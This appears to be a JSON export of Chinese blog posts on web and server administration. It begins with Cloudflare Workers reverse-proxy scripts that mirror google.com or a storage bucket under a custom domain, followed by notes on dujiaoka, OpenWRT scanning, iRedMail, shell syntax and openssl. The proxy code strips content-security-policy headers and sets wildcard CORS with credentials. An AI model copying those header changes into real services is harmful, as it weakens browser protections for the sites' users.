original_response_clone.body &#125; response = new Response(original_text, &#123; status, headers: new_response_headers &#125;) &#125; return response;&#125; async function replace_response_text(response, upstream_domain, host_name) &#123; let text = await response.text() var i, j; for (i in replace_dict) &#123; j = replace_dict[i] if (i == &#x27;$upstream&#x27;) &#123; i = upstream_domain &#125; else if (i == &#x27;$custom_domain&#x27;) &#123; i = host_name &#125; if (j == &#x27;$upstream&#x27;) &#123; j = upstream_domain &#125; else if (j == &#x27;$custom_domain&#x27;) &#123; j = host_name &#125; let re = new RegExp(i, &#x27;g&#x27;) text = text.replace(re, j); &#125; return text;&#125; async function device_status (user_agent_info) &#123; var agents = [&quot;Android&quot;, &quot;iPhone&quot;, &quot;SymbianOS&quot;, &quot;Windows Phone&quot;, &quot;iPad&quot;, &quot;iPod&quot;]; var flag = true; for (var v = 0; v &lt; agents.length; v++) &#123; if (user_agent_info.indexOf(agents[v]) &gt; 0) &#123; flag = false; break; &#125; &#125; return flag;&#125; 镜像网站带密码访问 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185// 替换成你想镜像的站点const upstream = &#x27;google.com&#x27; // 如果那个站点有专门的移动适配站点，否则保持和上面一致const upstream_mobile = &#x27;m.google.com&#x27; // 密码访问 const openAuth = falseconst username = &#x27;username&#x27;const password = &#x27;password&#x27; // 你希望禁止哪些国家访问const blocked_region = [&#x27;RU&#x27;] // 禁止自访问const blocked_ip_address = [&#x27;0.0.0.0&#x27;, &#x27;127.0.0.1&#x27;] // 替换成你想镜像的站点const replace_dict = &#123; &#x27;$upstream&#x27;: &#x27;$custom_domain&#x27;, &#x27;//google.com&#x27;: &#x27;&#x27;&#125; function unauthorized() &#123; return new Response(&#x27;Unauthorized&#x27;, &#123; headers: &#123; &#x27;WWW-Authenticate&#x27;: &#x27;Basic realm=&quot;goindex&quot;&#x27;, &#x27;Access-Control-Allow-Origin&#x27;: &#x27;*&#x27; &#125;, status: 401 &#125;);&#125; function parseBasicAuth(auth) &#123; try &#123; return atob(auth.split(&#x27; &#x27;).pop()).split(&#x27;:&#x27;); &#125; catch (e) &#123; return []; &#125;&#125; function doBasicAuth(request) &#123; const auth = request.headers.get(&#x27;Authorization&#x27;); if (!auth || !/^Basic [A-Za-z0-9._~+/-]+=*$/i.test(auth)) &#123; return false; &#125; const [user, pass] = parseBasicAuth(auth); return user === username &amp;&amp; pass === password;&#125; async function fetchAndApply(request) &#123; if (request.method === &#x27;OPTIONS&#x27;) // allow preflight request return new Response(&#x27;&#x27;, &#123; status: 200, headers: &#123; &#x27;Access-Control-Allow-Origin&#x27;: &#x27;*&#x27;, &#x27;Access-Control-Allow-Headers&#x27;: &#x27;*&#x27;, &#x27;Access-Control-Allow-Methods&#x27;: &#x27;GET, POST, PUT, HEAD, OPTIONS&#x27; &#125; &#125;); if (openAuth &amp;&amp; !doBasicAuth(request)) &#123; return unauthorized(); &#125; const region = request.headers.get(&#x27;cf-ipcountry&#x27;).toUpperCase(); const ip_address = request.headers.get(&#x27;cf-connecting-ip&#x27;); const user_agent = request.headers.get(&#x27;user-agent&#x27;); let response = null; let url = new URL(request.url); let url_host = url.host; if (url.protocol == &#x27;http:&#x27;) &#123; url.protocol = &#x27;https:&#x27; response = Response.redirect(url.href); return response; &#125; if (await device_status(user_agent)) &#123; upstream_domain = upstream &#125; else &#123; upstream_domain = upstream_mobile &#125; url.host = upstream_domain; if (blocked_region.includes(region)) &#123; response = new Response(&#x27;Access denied: WorkersProxy is not available in your region yet.&#x27;, &#123; status: 403 &#125;); &#125; else if(blocked_ip_address.includes(ip_address))&#123; response = new Response(&#x27;Access denied: Your IP address is blocked by WorkersProxy.&#x27;, &#123; status: 403 &#125;); &#125; else&#123; let method = request.method; let request_headers = request.headers; let new_request_headers = new Headers(request_headers); new_request_headers.set(&#x27;Host&#x27;, upstream_domain); new_request_headers.set(&#x27;Referer&#x27;, url.href); let original_response = await fetch(url.href, &#123; method: method, headers: new_request_headers &#125;) let original_response_clone = original_response.clone(); let original_text = null; let response_headers = original_response.headers; let new_response_headers = new Headers(response_headers); let status = original_response.status; new_response_headers.set(&#x27;access-control-allow-origin&#x27;, &#x27;*&#x27;); new_response_headers.set(&#x27;access-control-allow-credentials&#x27;, true); new_response_headers.delete(&#x27;content-security-policy&#x27;); new_response_headers.delete(&#x27;content-security-policy-report-only&#x27;); new_response_headers.delete(&#x27;clear-site-data&#x27;); const content_type = new_response_headers.get(&#x27;content-type&#x27;); if (content_type.includes(&#x27;text/html&#x27;) &amp;&amp; content_type.includes(&#x27;UTF-8&#x27;)) &#123; original_text = await replace_response_text(original_response_clone, upstream_domain, url_host); &#125; else &#123; original_text = original_response_clone.body &#125; response = new Response(original_text, &#123; status, headers: new_response_headers &#125;) &#125; return response;&#125; addEventListener(&#x27;fetch&#x27;, event =&gt; &#123; event.respondWith(fetchAndApply(event.request).catch(err =&gt; &#123; console.error(err); new Response(JSON.stringify(err.stack), &#123; status: 500, headers: &#123; &#x27;Content-Type&#x27;: &#x27;application/json&#x27; &#125; &#125;); &#125;));&#125;) async function replace_response_text(response, upstream_domain, host_name) &#123; let text = await response.text() var i, j; for (i in replace_dict) &#123; j = replace_dict[i] if (i == &#x27;$upstream&#x27;) &#123; i = upstream_domain &#125; else if (i == &#x27;$custom_domain&#x27;) &#123; i = host_name &#125; if (j == &#x27;$upstream&#x27;) &#123; j = upstream_domain &#125; else if (j == &#x27;$custom_domain&#x27;) &#123; j = host_name &#125; let re = new RegExp(i, &#x27;g&#x27;) text = text.replace(re, j); &#125; return text;&#125; async function device_status (user_agent_info) &#123; var agents = [&quot;Android&quot;, &quot;iPhone&quot;, &quot;SymbianOS&quot;, &quot;Windows Phone&quot;, &quot;iPad&quot;, &quot;iPod&quot;]; var flag = true; for (var v = 0; v &lt; agents.length; v++) &#123; if (user_agent_info.indexOf(agents[v]) &gt; 0) &#123; flag = false; break; &#125; &#125; return flag;&#125; 镜像网站指定目录 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142// 你要镜像的网站.const upstream = &#x27;objectstorage.ap-seoul-1.oraclecloud.com&#x27; // 镜像网站的目录，比如你想镜像某个网站的二级目录则填写二级目录的目录名，镜像 google 用不到，默认即可.const upstream_path = &#x27;/test/&#x27; // 镜像站是否有手机访问专用网址，没有则填一样的.const upstream_mobile = &#x27;objectstorage.ap-seoul-1.oraclecloud.com&#x27; // 屏蔽国家和地区.const blocked_region = [&#x27;&#x27;] // 屏蔽 IP 地址.const blocked_ip_address = [&#x27;0.0.0.0&#x27;, &#x27;127.0.0.1&#x27;] // 镜像站是否开启 HTTPS.const https = true // 文本替换.填你要镜像的网站const replace_dict = &#123; &#x27;$upstream&#x27;: &#x27;$custom_domain&#x27;, &#x27;//objectstorage.ap-seoul-1.oraclecloud.com&#x27;: &#x27;&#x27;&#125; // 以下保持默认，不要动addEventListener(&#x27;fetch&#x27;, event =&gt; &#123; event.respondWith(fetchAndApply(event.request));&#125;) async function fetchAndApply(request) &#123; const region = request.headers.get(&#x27;cf-ipcountry&#x27;).toUpperCase(); const ip_address = request.headers.get(&#x27;cf-connecting-ip&#x27;); const user_agent = &quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Safari/537.36&quot; let response = null; let url = new URL(request.url); let url_hostname = url.hostname; if (https == true) &#123; url.protocol = &#x27;https:&#x27;; &#125; else &#123; url.protocol = &#x27;http:&#x27;; &#125; if (await device_status(user_agent)) &#123; var upstream_domain = upstream; &#125; else &#123; var upstream_domain = upstream_mobile; &#125; url.host = upstream_domain; if (url.pathname == &#x27;/&#x27;) &#123; url.pathname = upstream_path; &#125; else &#123; url.pathname = upstream_path + url.pathname; &#125; if (blocked_region.includes(region)) &#123; response = new Response(&#x27;Access denied: WorkersProxy is not available in your region yet.&#x27;, &#123; status: 403 &#125;); &#125; else if (blocked_ip_address.includes(ip_address)) &#123; response = new Response(&#x27;Access denied: Your IP address is blocked by WorkersProxy.&#x27;, &#123; status: 403 &#125;); &#125; else &#123; let method = request.method; let request_headers = request.headers; let new_request_headers = new Headers(request_headers); new_request_headers.set(&#x27;Host&#x27;, url.hostname); new_request_headers.set(&#x27;Referer&#x27;, url.hostname); let original_response = await fetch(url.href, &#123; method: method, headers: new_request_headers &#125;) let original_response_clone = original_response.clone(); let original_text = null; let response_headers = original_response.headers; let new_response_headers = new Headers(response_headers); let status = original_response.status; new_response_headers.set(&#x27;access-control-allow-origin&#x27;, &#x27;*&#x27;); new_response_headers.set(&#x27;access-control-allow-credentials&#x27;, true); new_response_headers.delete(&#x27;content-security-policy&#x27;); new_response_headers.delete(&#x27;content-security-policy-report-only&#x27;); new_response_headers.delete(&#x27;clear-site-data&#x27;); const content_type = new_response_headers.get(&#x27;content-type&#x27;); if (content_type.includes(&#x27;text/html&#x27;) &amp;&amp; content_type.includes(&#x27;UTF-8&#x27;)) &#123; original_text = await replace_response_text(original_response_clone, upstream_domain, url_hostname); &#125; else &#123; original_text = original_response_clone.body &#125; response = new Response(original_text, &#123; status, headers: new_response_headers &#125;) &#125; return response;&#125; async function replace_response_text(response, upstream_domain, host_name) &#123; let text = await response.text() var i, j; for (i in replace_dict) &#123; j = replace_dict[i] if (i == &#x27;$upstream&#x27;) &#123; i = upstream_domain &#125; else if (i == &#x27;$custom_domain&#x27;) &#123; i = host_name &#125; if (j == &#x27;$upstream&#x27;) &#123; j = upstream_domain &#125; else if (j == &#x27;$custom_domain&#x27;) &#123; j = host_name &#125; let re = new RegExp(i, &#x27;g&#x27;) text = text.replace(re, j); &#125; return text;&#125; async function device_status(user_agent_info) &#123; var agents = [&quot;Android&quot;, &quot;iPhone&quot;, &quot;SymbianOS&quot;, &quot;Windows Phone&quot;, &quot;iPad&quot;, &quot;iPod&quot;]; var flag = true; for (var v = 0; v &lt; agents.length; v++) &#123; if (user_agent_info.indexOf(agents[v]) &gt; 0) &#123; flag = false; break; &#125; &#125; return flag;&#125; 原文 使用CloudFlare Workers反代网站","categories":[{"name":"做网站","slug":"做网站","permalink":"https://sobaigu.com/categories/%E5%81%9A%E7%BD%91%E7%AB%99/"}],"tags":[{"name":"博客建站","slug":"博客建站","permalink":"https://sobaigu.com/tags/%E5%8D%9A%E5%AE%A2%E5%BB%BA%E7%AB%99/"}]},{"title":"独角数卡搭建使用中的一些问题","slug":"dujiaoshuka-FAQ","date":"2021-12-13T01:13:06.000Z","updated":"2021-12-13T01:13:06.000Z","comments":true,"path":"dujiaoshuka-FAQ.html","permalink":"https://sobaigu.com/dujiaoshuka-FAQ.html","excerpt":"","text":"前言 使用独角数卡这套发卡系统一段时间，虽然没成交几单，但系统倒是折腾了好几遍o(╯□╰)o。在折腾过程中遇到了一些问题也摸索了一些解决途径，记录分享如下，给一样有需要的小白，其他高深的咱也不会。 redis密码 本来redis默认都是空密码的，但某些程序需要设置密码，如宝塔邮局的反垃圾邮件模块，不设置redis密码无法通过环境校验。然而在宝塔上设置的redis密码重启redis后就失效了……此时就会造成一些混乱。 在其他程序中，一般空密码都会设置为 null ，就如这样： 1234# redis配置REDIS_HOST=127.0.0.1REDIS_PASSWORD=nullREDIS_PORT=6379 如果你以为独角数卡也这样那你就错了……独角数卡需要留空，否则就会影响后面所有的功能，折腾得你死去活来。 1234# redis配置REDIS_HOST=127.0.0.1REDIS_PASSWORD=REDIS_PORT=6379 怎么设置永久密码？ 在redis安装目录，找到配置文件 redis.conf，宝塔安装的那位置应该就在：/www/server/redis/redis.conf，在里面找到 # requirepass foobared，删除注释改为自己的密码即可，如： 1requirepass foobared 保存退出，redis 重启或重载配置，其他对应程序也需要同步修改对应redis密码后重载或重启。 宝塔进程守护 独角数卡的官方wiki文档中，推荐使用 堡塔应用管理器 或者 supervisor ，aapanel 里只有 supervisor ，在启动命令中官方指定： 1/www/server/php/74/bin/php /www/wwwroot/dujiaoka/artisan queue:work 这个指定的PHP位置为源文件，大家安装的可能不一样，其实指向系统路径更通用： 1/usr/bin/php /www/wwwroot/dujiaoka/artisan queue:work 这样就不会受之后的升级等更换版本等影响，可以看下自己系统中PHP的位置： 1234root@1l:~# whereis phpphp: /usr/bin/phproot@1l:~# file /usr/bin/php/usr/bin/php: symbolic link to /www/server/php/74/bin/php PS：如果前面的redis对接不成功，这里的守护实例也是启动不了的。 系统设置无法保存 独角数卡的这个设计就比较坑，而且系统设置第一个tab页内容要先设置，如果没设置后面的设置都没法保存。系统设置中的数据是保存在redis缓存中的，并没有输出到配置文件或者数据库，如果搬家就得全部重来一遍。如果出现了死活无法保存，检查redis对接设置。 SMTP发信 发信设置属于系统设置中的一部分，所以跟redis息息相关，设置修改提交后需要在 supervisor 中重启守护实例后生效，否则会出现不发送或者发送内容和设置不一致的问题。 123456// 邮件数据$mailData = [ &#x27;created_at&#x27; =&gt; $order-&gt;create_at, &#x27;product_name&#x27; =&gt; $order-&gt;goods-&gt;gd_name, &#x27;webname&#x27; =&gt; dujiaoka_config_get(&#x27;text_logo&#x27;, &#x27;独角数卡&#x27;), //取不到配置就用默认值 &#x27;weburl&#x27; =&gt; config(&#x27;app.url&#x27;) ?? &#x27;http://dujiaoka.com&#x27;, 如果用的QQ邮箱发信，虽然马化腾告诉你可以用 465 或者 587 端口发信，实测告诉咱 587 是用来扇脸的。 自带安装程序清空数据库 当网站根目录下删除 install.lock 后，访问首页将会默认进入独角数卡的安装环节，此安装步骤会将数据库清空，所以做此步骤前请务必备份数据库，安装完成后再导入数据库恢复数据。 后台无法访问报 500 错误 基本上是数据库连接不上了，检查 MySQL 和 redis 状态，以及网站文件夹权限，redis 相关设置参考前文。 登录弹 0 error 检查下是不是启用了 https ，使用 https 需要在 .env 中添加相应配置： 123# 后台登录地址ADMIN_ROUTE_PREFIX=/adminADMIN_HTTPS=true //添加这行配置就可以了","categories":[{"name":"做网站","slug":"做网站","permalink":"https://sobaigu.com/categories/%E5%81%9A%E7%BD%91%E7%AB%99/"}],"tags":[{"name":"博客建站","slug":"博客建站","permalink":"https://sobaigu.com/tags/%E5%8D%9A%E5%AE%A2%E5%BB%BA%E7%AB%99/"}]},{"title":"OpenWRT路由器启用扫描仪功能（Hewlett-Packard DeskJet 2130_series）","slug":"scanner-hp-dj-2130-with-openwrt","date":"2021-12-11T07:00:08.000Z","updated":"2021-12-11T07:00:08.000Z","comments":true,"path":"scanner-hp-dj-2130-with-openwrt.html","permalink":"https://sobaigu.com/scanner-hp-dj-2130-with-openwrt.html","excerpt":"","text":"前言 曾经花两百多大洋买了个打印扫描一体机，型号为：Hewlett-Packard DeskJet 2130_series ，是个低端打印机，只有个USB接口，不带网络功能。之前一直插在新3路由器上，也能像网络打印机一样打印，但一直都没折腾远程扫描功能，毕竟扫描的次数有限。 路由器安装扫描服务 路由器上安装打印服务就不多说了，一般固件都会带，软件中心也能搜到打印组件安装好就行。扫描服务需要在SSH终端下安装如下套件： 12opkg updateopkg install libsane sane-daemon sane-frontends sane-hp hplip-sane xinetd 安装完成后，将扫描仪连接到路由器的USB端口并打开扫描仪。 首先测试是否已成功安装并连接扫描仪，您可以运行 scanimage -L 查看返回的信息: 1device `hpaio:/usb/DeskJet_2130_series?serial=CN...&#x27; is a Hewlett-Packard DeskJet_2130_series all-in-one 以上就是路由器认到的一体机设备了，一次性通过。 扫描服务设置 实际上，对于临时使用，您可以SSH到路由器并执行 scanimage 命令以扫描图片（图片临时存储在路由器上），然后将其下载到计算机。 但是，考虑到路由器有限的ROM空间以及易用性，我们不能忘记远程扫描的初衷。 一样的，还是在SSH终端环境做如下操作： 查看修改 /etc/xinetd.d/sane-port： 12345678910service sane-port&#123; socket_type = stream port = 6566 wait = no user = root group = root server = /usr/sbin/saned disable = no #如这里是yes 那改为no&#125; 查看修改 /etc/xinetd.conf 12345678910defaults&#123; only_from = 192.168.10.1/24 #改成你的内网网段 instances = 60 log_type = SYSLOG authpriv info log_on_success = HOST PID log_on_failure = HOST cps = 25 30&#125;includedir /etc/xinetd.d 在 /etc/sane.d/saned.conf 中增加： 1192.168.10.1/24 #你的内网网段 启动 xinetd 服务 12/etc/init.d/xinetd restart/etc/init.d/xinetd enable 扫描软件客户端 这里演示windows客户端，其他客户端自行琢磨。网上查到主要有3款客户端： wiasane：主要是个驱动，安装的时候指定网络扫描仪IP，之后配合其他扫描客户端【HP的除外】使用 sanewin：这个软件有点简陋，但功能还算好 ScanTwain：其实是个scan image 模块，官网都要翻墙才能打开，妥妥的90年代风格，pass掉吧。 安装 wiasane 后，可以直接用windows自带的扫描功能，也可以去appstore下载一款叫 扫描仪 的免费应用，功能还不错，完全满足需求。唯一不足的便是 wiasane 驱动环境只能灰度扫描，扫描彩色选项不可选，而安装 sanewin 的时候可以彩色扫描。 参考文档 OpenWRT扫描仪共享关键问题解决 共享HP / HP扫描仪的OpenWrt路由器 openwrt路由器配置扫描仪","categories":[{"name":"玩系统","slug":"玩系统","permalink":"https://sobaigu.com/categories/%E7%8E%A9%E7%B3%BB%E7%BB%9F/"}],"tags":[{"name":"软件","slug":"软件","permalink":"https://sobaigu.com/tags/%E8%BD%AF%E4%BB%B6/"}]},{"title":"GO运行时提示：server certificate verification failed","slug":"server-certificate-verification-failed","date":"2021-12-09T13:29:44.000Z","updated":"2021-12-09T13:29:44.000Z","comments":true,"path":"server-certificate-verification-failed.html","permalink":"https://sobaigu.com/server-certificate-verification-failed.html","excerpt":"","text":"前言 Github上找了个go程序，修改完跑不起来，就照错误提示，重装了 ca-certificates 也解决不了，原来还少了另外一个依赖，做个笔记。 提示现象 在跑go脚步时，一大堆信息中有这样报错提示： 1fatal: unable to access &#x27;https://gopkg.in/yaml.v3/&#x27;: server certificate verification failed 解决办法 更新安装 ca-certificates 和 libgnutls30 1apt update &amp;&amp; apt install ca-certificates libgnutls30 -y 参考文档 fatal: unable to access ‘https://gopkg.in/yaml.v3/’: server certificate verification failed","categories":[{"name":"搞软件","slug":"搞软件","permalink":"https://sobaigu.com/categories/%E6%90%9E%E8%BD%AF%E4%BB%B6/"}],"tags":[{"name":"shell","slug":"shell","permalink":"https://sobaigu.com/tags/shell/"}]},{"title":"Network ports compatible with Cloudflares proxy","slug":"network-ports-compatible-with-cloudflare-proxy","date":"2021-12-02T05:15:57.000Z","updated":"2021-12-02T05:15:57.000Z","comments":true,"path":"network-ports-compatible-with-cloudflare-proxy.html","permalink":"https://sobaigu.com/network-ports-compatible-with-cloudflare-proxy.html","excerpt":"","text":"前言 Cloudflare 可代理通过一些指定端口的流量。 如果流量位于不同的端口上，则可将其作为只使用DNS的记录添加到您的 Cloudflare DNS 页面，(灰色云 = 不使用 Cloudflare 代理或缓存)。 Cloudflare 的映射为全端口映射，即如果你源站使用的是 8443 非标准端口，使用 Cloudflare 服务后，访问的防止后面还需要带 8443 。无法将非标准端口反代为标准的 80 或 443 端口。 HTTP HTTP ports supported by Cloudflare 80 8080 8880 2052 2082 2086 2095 HTTPS HTTPS ports supported by Cloudflare 443 2053 2083 2087 2096 8443 Ports with no cache Caching is disabled for the following ports 2052 2053 2082 2083 2086 2087 2095 2096 8880 8443 内容来源 原文：Network ports","categories":[{"name":"做网站","slug":"做网站","permalink":"https://sobaigu.com/categories/%E5%81%9A%E7%BD%91%E7%AB%99/"}],"tags":[{"name":"博客建站","slug":"博客建站","permalink":"https://sobaigu.com/tags/%E5%8D%9A%E5%AE%A2%E5%BB%BA%E7%AB%99/"}]},{"title":"安装iRedMail邮件服务器提示FQDN错误问题","slug":"software-iRedMail-hosts","date":"2021-11-07T14:51:07.000Z","updated":"2021-11-07T14:51:07.000Z","comments":true,"path":"software-iRedMail-hosts.html","permalink":"https://sobaigu.com/software-iRedMail-hosts.html","excerpt":"","text":"前言 最近觉着宝塔邮局不怎么好用，也曾怀疑它的发件到达率，所以折腾下 iRedMail 邮件服务器，据说发件 spam 测试有10分。 错误问题 花重金开了个VPS玩，结果运行 iRedMail 安装脚本就遇到了问题： 12345&lt;&lt; ERROR &gt;&gt; Please configure a fully qualified domain name (FQDN) in /etc/hosts before we go further.Example:127.0.0.1 mail.netren.org mail localhost 这个错误提示也很明显了，可就是这么明显的问题，始终就不知道怎么回事。看来看去hosts也没什么问题 1234127.0.0.1 localhost localhost.localdomain::1 localhost localhost.localdomain2607:f130:0:f3::7375:9415 mail127.0.0.1 mail mail.sobaigu.com ping mail 和 mail.sobaigu.com 都能返回本机回环结果…… 解决 鉴于理科生的本能，打开了 iRedMail.sh 看个究竟，里面也没见关于 FQDN 相关检测代码。 用 hostname -f 查了下，主机名为 localhost ，把 hosts 中对应回环劫持配置腾挪下顺序试下： 123127.0.0.1 mail.sobaigu.com mail localhost localhost.localdomain::1 localhost localhost.localdomain2607:f130:0:f3::7375:9415 mail 如上代码，将 mail.sobaigu.com 放在第一个位置，此时 hostname -f 得到的主机名便是 mail.sobaigu.com ，这就是所谓的 fully qualified domain name (FQDN)，以前从未注意到这样的问题。","categories":[{"name":"做网站","slug":"做网站","permalink":"https://sobaigu.com/categories/%E5%81%9A%E7%BD%91%E7%AB%99/"}],"tags":[{"name":"Linux","slug":"Linux","permalink":"https://sobaigu.com/tags/Linux/"}]},{"title":"shell中括号的特殊用法及if多条件判断","slug":"bash-shell-if-parameters","date":"2021-11-03T11:24:51.000Z","updated":"2021-11-03T11:24:51.000Z","comments":true,"path":"bash-shell-if-parameters.html","permalink":"https://sobaigu.com/bash-shell-if-parameters.html","excerpt":"","text":"前言 终究还是有些符号，用得不好或者敲错调试半天也不知道问题在哪。搜了些符号用法，做个笔记备用备查。 bash [ ] 单双括号 基本要素： [ ] 两个符号左右都要有空格分隔 内部操作符与操作变量之间要有空格：如 [ “a” = “b” ] 字符串比较中， &gt; &lt; 需要写成 \\&gt; \\&lt; 进行转义 [ ] 中字符串或者 $&#123;&#125; 变量尽量使用 &quot;&quot; 双引号扩住，避免值未定义引用而出错的好办法 [ ] 中可以使用 –a –o 进行逻辑运算 [ ] 是 bash 内置命令：[ is a shell builtin 测试时逻辑操作符 -a：逻辑与，操作符两边均为真，结果为真，否则为假。 -o：逻辑或，操作符两边一边为真，结果为真，否则为假。 !：逻辑否，条件为假，结果为真。 举例: [ -w result.txt-a -w score.txt ] ;echo $? // 测试两个文件是否均可写 bash [[ ]] 双方括号 基本要素： [[ ]] 两个符号左右都要有空格分隔 内部操作符与操作变量之间要有空格：如 [[ “a” = “b” ]] 字符串比较中，可以直接使用 &gt; &lt; 无需转义 [[ ]] 中字符串或者 $&#123;&#125; 变量尽量如未使用 &quot;&quot; 双引号扩住的话，会进行模式和元字符匹配 123[root@localhostkuohao]# [[ &quot;ab&quot;=a* ]] &amp;&amp; echo &quot;ok&quot; ok [[ ]] 内部可以使用 &amp;&amp; || 进行逻辑运算 [[ ]] 是 bash keyword：[[ is a shell keyword [[ ]] 其他用法都和 [ ] 一样，二者共同特性： &amp;&amp; || -a –o 处理 [ exp1 -a exp2 ] = [[ exp1 &amp;&amp; exp2 ]] = [ exp1 ] &amp;&amp; [ exp2 ] = [[ exp1 ]] &amp;&amp; [[ exp2 ]] [ exp1 -o exp2 ] = [[ exp1 || exp2 ]] = [ exp1 ]|| [ exp2 ] = [[ exp1 ]] || [[ exp2 ]] 12345678910[root@localhost ~]# if [[ &quot;a&quot; == &quot;a&quot; &amp;&amp; 2 -gt1 ]] ;then echo &quot;ok&quot; ;fiok[root@localhost ~]# if [[ &quot;a&quot; == &quot;a&quot; ]] &amp;&amp; [[2 -gt 1 ]] ;then echo &quot;ok&quot; ;fiok[root@localhost ~]# if [[ &quot;a&quot; == &quot;a&quot; ]] || [[ 2 -gt 1]] ;then echo &quot;ok&quot; ;fiok[root@localhost ~]# if [[ &quot;a&quot; == &quot;a&quot; ]] || [[ 2 -gt10 ]] ;then echo &quot;ok&quot; ;fiok[root@localhost ~]# if [[ &quot;a&quot; == &quot;a&quot; || 2 -gt 10 ]] ;then echo &quot;ok&quot; ;fiok [[ ]] 和 [ ] 都可以和 ! 配合使用 优先级 ! &gt; &amp;&amp; &gt; || 逻辑运算符 &lt; 关系运算符 逻辑运算符： ! &amp;&amp; || -a -o 关系运算符： &lt; &gt; \\&gt; \\&lt; == = != – eq –ne -gt -ge –lt -le [[ ]] 比 [ ] 具备的优势 [[ 是 bash 程序语言的关键字。并不是一个命令，[[ ]] 结构比 [ ] 结构更加通用。在 [[ 和 ]] 之间所有的字符都不会发生文件名扩展或者单词分割，但是会发生参数扩展和命令替换。 支持字符串的模式匹配，使用 =~ 操作符时甚至支持shell的正则表达式。字符串比较时可以把右边的作为一个模式，而不仅仅是一个字符串，比如 [[ hello == hell? ]]，结果为真。[[ ]] 中匹配字符串或通配符，不需要引号。 使用 [[ ... ]] 条件判断结构，而不是 [ ... ]，能够防止脚本中的许多逻辑错误。比如 &amp;&amp;、||、&lt; 和 &gt; 操作符能够正常存在于 [[ ]] 条件判断结构中，但是如果出现在 [ ] 结构中的话，会报错。 bash把双中括号中的表达式看作一个单独的元素，并返回一个退出状态码。 if 条件判断中有多个条件 或 ||： 1234567#!/bin/bashscore=$1if [ $score = 5 ]||[ $score = 3 ];then echo rightelse echo wrongfi 1234567#!/bin/bashscore=$1if [ $score -gt 5 ]||[ $score -lt 3 ];then echo rightelse echo wrongfi 1234567#!/bin/bashscore=$1if [ $score -gt 15 ]||([ $score -lt 8 ]&amp;&amp;[ $score -ne 5 ]);then echo rightelse echo wrongfi 或 -o： 12345#!/bin/bashcount=&quot;$1&quot;if [ $count -gt 15 -o $count -lt 5 ];then echo rightfi 且 -a： 12345#!/bin/bashcount=&quot;$1&quot;if [ $count -gt 5 -a $count -lt 15 ];then echo rightfi 多条件组合 123456score=$1if [[ $score -gt 15 || $score -lt 8 &amp;&amp; $score -ne 5 ]];then echo rightelse echo wrongfi 记住必须加两个中括号。 总结 Shell中的括号有其特殊的用法，现总结如下: 符号 $ 后的括号 $&#123;a&#125;： 变量 a的值，在不引起歧义的情况下可以省略大括号。 $(cmd)：命令替换，结果为shell命令 cmd 的输出，和 cmd 效果相同，不过某些Shell版本不支持 $() 形式的命令替换，如 tcsh。 $((exp))：和 expr exp 效果相同，计算数学表达式 exp 的数值，其中 exp 只要符合 C语言 的运算规则即可，甚至三目运算符和逻辑表达式都可以计算。 多条命令执行 (cmd1;cmd2;cmd3)：新开一个子shell顺序执行命令 cmd1&gt;cmd2&gt;cmd3 ，各命令之间用分号隔开，最后一个命令后可以没有分号。 &#123;cmd1;cmd2;cmd3;&#125;：在当前shell顺序执行命令 cmd1&gt;cmd2&gt;cmd3，各命令之间用分号隔开，最后一个命令后必须有分号，第一条命令和左括号之间必须用空格隔开。 对 &#123;&#125; 和 () 而言，括号中的重定向符只影响该条命令，而括号外的重定向符影响到括号中的所有命令。 双括号的特殊用法 (())：增强括号的用法，常用于算术运算比较. 双括号中的变量可以不使用 $ 符号前缀，只要括号中的表达式符合C语言运算规则，支持多个表达式用逗号分开。比如可以直接使用 for((i=0;i&lt;5;i++))，如果不使用双括号，则为 for i in seq 0 4或者 for i in &#123;0..4&#125;。再如可以直接使用 if (($i&lt;5))，如果不使用双括号，则为 if [ $i -lt 5 ]。 [[]]：增强方括号用法，常用于字符串的比较. 主要用于条件测试，双括号中的表达式可以使用 &amp;&amp;，||，&lt;，&gt; 等C语言语法。比如可以直接使用 if [[ $a != 1 &amp;&amp; $a != 2 ]]，如果不适用双括号，则为 if [ $a -ne 1] &amp;&amp; [ $a != 2 ] 或者 if [ $a -ne 1 -a $a != 2 ]。 参考文档 shell中的一些特殊字符用法知识 本文转自：shell中括号的特殊用法 linux if多条件判断","categories":[{"name":"学编程","slug":"学编程","permalink":"https://sobaigu.com/categories/%E5%AD%A6%E7%BC%96%E7%A8%8B/"}],"tags":[{"name":"shell","slug":"shell","permalink":"https://sobaigu.com/tags/shell/"}]},{"title":"将ssl证书从 `.pem` 转换为 `.crt` 和 `.key`","slug":"ssl-pem-to-cert-key","date":"2021-09-28T08:32:26.000Z","updated":"2021-09-28T08:32:26.000Z","comments":true,"path":"ssl-pem-to-cert-key.html","permalink":"https://sobaigu.com/ssl-pem-to-cert-key.html","excerpt":"","text":"前言 经常会涉及域名证书部署，某个服务器上装上宝塔面板，申请倒不难。但因为域名是重复的，每换个服务器，都新申请一遍证书着实没必要。在某个服务器上宝塔申请过了，但宝塔申请的证书格式是 .pem 的，而应用却要求 .crt 和 .key ，所以需要将格式转换下，然后直接拷贝到新服务器上使用即可。 .pem 转 .crt 和 .key 宝塔申请的证书文件默认位于：/www/server/panel/vhost/ssl ，这个文件夹下按域名存放着对应的.pem 文件。从 .pem 文件中提取/转换证书 .crt 和私钥 .key 文件可用以下命令： .pem 转 .crt 格式 1openssl x509 -in fullchain.pem -out fullchain.crt .pem转 .key 格式 1openssl rsa -in privkey.pem -out privkey.key 参考文档 证书格式介绍及如何将.pem转换为.crt和.key？ 